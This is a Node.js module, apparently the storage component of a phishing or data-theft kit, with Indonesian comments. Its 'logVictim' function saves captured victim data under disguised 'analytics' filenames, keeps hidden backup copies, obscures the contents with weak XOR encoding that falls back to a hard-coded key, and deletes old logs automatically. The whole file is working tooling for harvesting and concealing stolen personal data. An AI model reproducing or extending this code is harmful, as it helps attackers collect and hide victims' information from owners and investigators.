const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

class StealthLogger {
    constructor() {
        this.logDir = 'logs';
        this.ensureLogDir();
        this.currentLogFile = null;
    }
    
    ensureLogDir() {
        if (!fs.existsSync(this.logDir)) {
            fs.mkdirSync(this.logDir, { recursive: true, mode: 0o700 });
        }
    }
    
    getLogFileName() {
        const date = new Date();
        const dateStr = date.toISOString().split('T')[0];
        const randomId = crypto.randomBytes(4).toString('hex');
        return `analytics_${dateStr}_${randomId}.json`;
    }
    
    logVictim(data) {
        try {
            const filename = this.getLogFileName();
            const filepath = path.join(this.logDir, filename);
            
            // Encrypt data sebelum simpan
            const encrypted = this.encryptData(data);
            
            fs.writeFileSync(filepath, encrypted, {
                encoding: 'utf8',
                mode: 0o600,
                flag: 'wx' // Fail if file exists
            });
            
            // Backup ke file kedua (hidden)
            const backupFile = path.join(this.logDir, `.${filename}.bak`);
            fs.writeFileSync(backupFile, encrypted, {
                encoding: 'utf8',
                mode: 0o600
            });
            
            console.log(`[LOG] Victim data saved: ${filename}`);
            return filename;
        } catch (error) {
            console.error('[LOG ERROR]', error.message);
            return null;
        }
    }
    
    encryptData(data) {
        const jsonStr = JSON.stringify(data, null, 2);
        
        // XOR encryption sederhana
        const key = process.env.ENCRYPTION_KEY || 'default_key_32bytes_long_here!!';
        let encrypted = '';
        
        for (let i = 0; i < jsonStr.length; i++) {
            encrypted += String.fromCharCode(
                jsonStr.charCodeAt(i) ^ key.charCodeAt(i % key.length)
            );
        }
        
        // Base64 encode
        return Buffer.from(encrypted).toString('base64');
    }
    
    decryptData(encryptedBase64) {
        try {
            const encrypted = Buffer.from(encryptedBase64, 'base64').toString();
            const key = process.env.ENCRYPTION_KEY || 'default_key_32bytes_long_here!!';
            let decrypted = '';
            
            for (let i = 0; i < encrypted.length; i++) {
                decrypted += String.fromCharCode(
                    encrypted.charCodeAt(i) ^ key.charCodeAt(i % key.length)
                );
            }
            
            return JSON.parse(decrypted);
        } catch (error) {
            return null;
        }
    }
    
    cleanupOldLogs(days = 7) {
        const cutoff = Date.now() - (days * 24 * 60 * 60 * 1000);
        
        fs.readdirSync(this.logDir).forEach(file => {
            const filepath = path.join(this.logDir, file);
            const stats = fs.statSync(filepath);
            
            if (stats.mtimeMs < cutoff) {
                fs.unlinkSync(filepath);
                console.log(`[CLEANUP] Deleted old log: ${file}`);
            }
        });
    }
    
    getStats() {
        const files = fs.readdirSync(this.logDir)
            .filter(f => f.endsWith('.json') && !f.startsWith('.'));
        
        return {
            totalLogs: files.length,
            latestLog: files[files.length - 1] || null,
            totalSize: files.reduce((acc, file) => {
                return acc + fs.statSync(path.join(this.logDir, file)).size;
            }, 0)
        };
    }
}

module.exports = new StealthLogger();
